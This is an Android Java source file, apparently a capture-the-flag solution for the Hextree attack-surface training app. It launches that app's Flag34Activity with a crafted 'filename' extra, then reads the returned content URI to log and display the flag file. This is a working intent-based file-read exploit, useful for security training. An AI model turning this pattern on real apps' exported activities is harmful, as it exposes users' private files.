package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Flag34Fragment extends Fragment {
    private static final String TAG = "Flag34Fragment";

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag34, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag34);
        
        launchButton.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag34Activity"));
            intent.putExtra("filename","flags/flag34.txt");
            startActivityForResult(intent, 1337);
        });

        return view;
    }
    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        Utils.showDialog(getContext(), intent);
        InputStream inputStream = null;
        try {
            inputStream = requireContext().getContentResolver().openInputStream(intent.getData());
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String line;
            while((line = bufferedReader.readLine()) != null) {
                Log.d(TAG, "[+] " + line);
                Toast.makeText(getContext(), line, Toast.LENGTH_LONG).show();
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }
} 